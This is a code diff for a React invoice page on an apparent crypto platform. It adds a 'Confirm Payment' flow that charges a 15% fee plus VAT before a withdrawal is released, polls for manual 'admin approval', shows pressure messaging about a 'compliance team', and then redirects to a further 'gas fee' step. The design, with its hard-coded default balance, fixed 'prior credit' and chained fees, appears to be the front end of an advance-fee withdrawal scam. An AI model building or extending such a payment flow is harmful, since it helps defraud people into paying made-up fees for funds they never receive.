@@ -1,5 +1,8 @@
+import { useEffect, useRef, useState } from "react";
 import { useLocation } from "wouter";
 import { loadInvoiceContext } from "@/hooks/use-transactions";
+import { useAuth } from "@/lib/auth-context";
+import { publicApi } from "@/lib/api";
 
 const FEE_RATE = 0.15;
 
@@ -27,8 +30,21 @@ function buildInvoiceItems(feeTotal: number) {
   return items;
 }
 
+type ConfirmState = "idle" | "submitting" | "waiting" | "approved" | "denied" | "error";
+
 export default function Invoice() {
   const [, navigate] = useLocation();
+  const { user } = useAuth();
+
+  const [confirmState, setConfirmState] = useState<ConfirmState>("idle");
+  const [errorMsg, setErrorMsg] = useState<string>("");
+  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
+
+  useEffect(() => {
+    return () => {
+      if (pollRef.current) clearInterval(pollRef.current);
+    };
+  }, []);
 
   const ctx = loadInvoiceContext();
   const withdrawalAmount = ctx?.usdAmount && ctx.usdAmount > 0 ? ctx.usdAmount : 20435.65;
@@ -45,6 +61,46 @@ export default function Invoice() {
   const priorCredit = 2000;
   const totalDue = Math.round((grossTotal - priorCredit) * 100) / 100;
 
+  async function handleConfirmPayment() {
+    if (!user) {
+      setErrorMsg("You must be signed in to confirm payment.");
+      setConfirmState("error");
+      return;
+    }
+    setErrorMsg("");
+    setConfirmState("submitting");
+    try {
+      const { request } = await publicApi.submitPaymentConfirmation({
+        name: user.name,
+        email: user.email,
+        amount: totalDue.toFixed(2),
+        currency: "USD",
+        notes: `Confirm payment for invoice ${txId.toUpperCase()} — withdrawal $${withdrawalAmount.toFixed(2)} (15% fee + 7.5% VAT, less $${priorCredit} credit). Awaiting admin approval.`,
+      });
+      setConfirmState("waiting");
+
+      pollRef.current = setInterval(async () => {
+        try {
+          const status = await publicApi.getRequestStatus(request.id);
+          if (status.status === "approved") {
+            if (pollRef.current) clearInterval(pollRef.current);
+            setConfirmState("approved");
+            setTimeout(() => navigate("/cashapp-gas-fee"), 1200);
+          } else if (status.status === "denied" || status.status === "rejected") {
+            if (pollRef.current) clearInterval(pollRef.current);
+            setConfirmState("denied");
+          }
+        } catch {
+          // ignore transient polling errors
+        }
+      }, 3000);
+    } catch (err) {
+      const msg = err instanceof Error ? err.message : "Failed to submit payment confirmation";
+      setErrorMsg(msg);
+      setConfirmState("error");
+    }
+  }
+
   const now = new Date();
   const invoiceDate = now.toLocaleDateString("en-US", { month: "long", day: "numeric", year: "numeric" });
   const dueDate = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000).toLocaleDateString("en-US", { month: "long", day: "numeric", year: "numeric" });
@@ -53,6 +109,46 @@ export default function Invoice() {
 
   return (
     <div className="min-h-screen bg-[#0f1117] p-4 md:p-8">
+      {(confirmState === "submitting" || confirmState === "waiting" || confirmState === "approved") && (
+        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-sm flex items-center justify-center p-4">
+          <div className="bg-[#161b27] border border-emerald-500/30 rounded-2xl p-8 max-w-md w-full text-center shadow-2xl">
+            {confirmState === "approved" ? (
+              <>
+                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-emerald-500/15 flex items-center justify-center">
+                  <svg className="w-9 h-9 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
+                  </svg>
+                </div>
+                <h2 className="text-xl font-bold text-white mb-2">Payment Approved!</h2>
+                <p className="text-sm text-emerald-300">Redirecting you to the next step…</p>
+              </>
+            ) : (
+              <>
+                <div className="w-16 h-16 mx-auto mb-4 relative">
+                  <svg className="animate-spin w-16 h-16 text-emerald-400" fill="none" viewBox="0 0 24 24">
+                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
+                    <path className="opacity-80" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+                  </svg>
+                </div>
+                <h2 className="text-xl font-bold text-white mb-2">
+                  {confirmState === "submitting" ? "Submitting payment…" : "Confirming your payment"}
+                </h2>
+                <p className="text-sm text-amber-300 font-semibold mb-3 uppercase tracking-wide">
+                  Don't leave this page while your payment is being confirmed
+                </p>
+                <p className="text-xs text-slate-400 leading-relaxed">
+                  We've notified our compliance team. Your payment will be confirmed once an admin reviews and approves the request. This can take a few minutes.
+                </p>
+                <div className="mt-5 flex items-center justify-center gap-2 text-xs text-slate-500">
+                  <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
+                  Awaiting admin approval…
+                </div>
+              </>
+            )}
+          </div>
+        </div>
+      )}
+
       <div className="max-w-4xl mx-auto">
         {/* Navigation back */}
         <button
@@ -352,6 +448,28 @@ export default function Invoice() {
               </div>
             </div>
           </div>
+        </div>
+
+        {/* Confirm Payment - main action inside invoice body footer */}
+        <div className="mt-6 flex flex-col items-center gap-3">
+          <button
+            onClick={handleConfirmPayment}
+            disabled={confirmState !== "idle" && confirmState !== "error" && confirmState !== "denied"}
+            className="flex items-center gap-2 px-8 py-4 bg-emerald-500 hover:bg-emerald-400 disabled:opacity-60 disabled:cursor-not-allowed text-black rounded-xl text-base font-extrabold transition-colors shadow-lg shadow-emerald-500/30"
+          >
+            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+            Confirm Payment — ${totalDue.toLocaleString("en-US", { minimumFractionDigits: 2 })}
+          </button>
+          {confirmState === "denied" && (
+            <p className="text-xs text-red-400 text-center">
+              Your payment confirmation was denied. Please contact billing@cryptovault.io or try again.
+            </p>
+          )}
+          {confirmState === "error" && (
+            <p className="text-xs text-red-400 text-center">{errorMsg || "Failed to submit. Please try again."}</p>
+          )}
         </div>
 
         {/* Action buttons */}
